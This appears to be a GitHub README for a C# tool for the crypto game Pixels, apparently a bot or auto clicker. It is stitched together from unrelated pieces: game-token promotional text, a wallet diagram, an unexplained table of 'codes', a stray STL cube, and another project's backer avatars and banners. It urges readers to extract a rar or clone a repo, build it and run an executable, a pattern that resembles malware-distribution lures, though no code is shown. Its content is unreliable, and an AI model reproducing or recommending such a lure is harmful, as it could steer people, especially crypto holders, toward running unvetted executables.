<div align="center">
<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
</div>

<h1 align="center">
    <a href="https://amplication.com/#gh-light-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
    <a href="https://amplication.com/#gh-dark-mode-only">
    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
    </a>
</h1>

<p align="center">
  <i align="center">Building System Applications with C# & C++ 🚀</i>
</p>
  
<p align="center">
  Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️
</p>

## Read About
In 2023, Pixels emerged as a leading web3 game with DAUs surpassing 180K, thanks to our vibrant community and switch to the Ronin blockchain. This growth set a solid foundation for 2024, as we enter a new growth phase with $PIXEL's listing on EXCHANGE, enhancing gameplay and our ecosystem. We're excited to build on this momentum and improve the web3 gaming space for our dedicated player base.For any web3 game to achieve long-term success, sustainability must always be prioritized. We aim to combine good game design, lessons from the leading web2 games, and what’s working from the top web3 games into delivering what we believe to be a long-term and sustainable economy for our game.We have evolved how we think about our tokens in-game and have made the strategic decision to focus on $PIXEL and to phase out $BERRY. All $BERRY holders will be rewarded with $PIXEL, with the reward proportionate to the amount of $BERRY owned.

#### **Please Read First What You Need Part.**
#### <p align="Left"><a href="#what-you-need-1">WHAT YOU NEED</a></p> 

![244](https://github.com/user-attachments/assets/5e0fb33d-9b8f-4531-938a-2df193f5be90)

https://github.com/user-attachments/assets/3ab37cd5-30e6-4967-8c76-a026ac00ec10




```mermaid
erDiagram
    PLAYER_WALLET {
        string id
        string playerName
        float inGameCurrency
    }
    PLAYER_WALLET ||--o{ GAME_TRANSACTION : initiates
    PLAYER_WALLET ||--o{ GAME_BALANCE : updates
    GAME_TRANSACTION ||--o{ GAME_CONFIRMATION : confirms
    GAME_CONFIRMATION ||--o{ PLAYER_WALLET : updates
    GAME_CONFIRMATION ||--o{ GAME_BLOCKCHAIN : records
    GAME_BLOCKCHAIN }|--o{ GAME_TRANSACTION : contains
    GAME_BLOCKCHAIN }|--o{ GAME_BALANCE : contains
```
### What You Need
----
                    
| Tool              | Code         |
| ----------------- | ------------ |
| Blockchain Explorer | 0000       |
| Cryptogame  | Daf     |
| Farm      | 000          |
| Auto Clicker  | ST8 |
| Solana Explorer   | 91           |

                
----
<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- ROADMAP -->
## Roadmap

- [x] New Gui
- [ ] Add back to top links
- [x] Add Additional Templates w/ Examples
- [x] New Features
- [ ] Multi-language Support
    - [ ] Chinese
    - [ ] Turkish
    - [ ] French
    - [ ] Spanish

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting Started

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
* npm
  ```sh
  npm install npm@latest -g
  ```

### Installation

1. Download Visual Studio 2022
_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
> Download These

2. Clone the repo
   ```sh
   git clone https://github.com/SoonAdd/Addsoon.git
   ```
3. OR

![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)


4. _Then open the sln (Project Solution) file_

![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)

5. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/Executable.exe
   ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>

```stl
solid cube_corner
  facet normal 0.0 -1.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 1.0 0.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
  facet normal 0.0 0.0 -1.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 1.0 0.0 0.0
    endloop
  endfacet
  facet normal -1.0 0.0 0.0
    outer loop
      vertex 0.0 0.0 0.0
      vertex 0.0 0.0 1.0
      vertex 0.0 1.0 0.0
    endloop
  endfacet
  facet normal 0.577 0.577 0.577
    outer loop
      vertex 1.0 0.0 0.0
      vertex 0.0 1.0 0.0
      vertex 0.0 0.0 1.0
    endloop
  endfacet
endsolid
```
<p align="right">(<a href="#readme-top">back to top</a>)</p>

<!-- CONTRIBUTING -->
## Contributing
<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<p align="center">
    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
</p>


Not sure where to start? Join our discord and we will help you get started!

<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>

<p align="right">(<a href="#readme-top">back to top</a>)</p>

<p align="center">
  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
</p>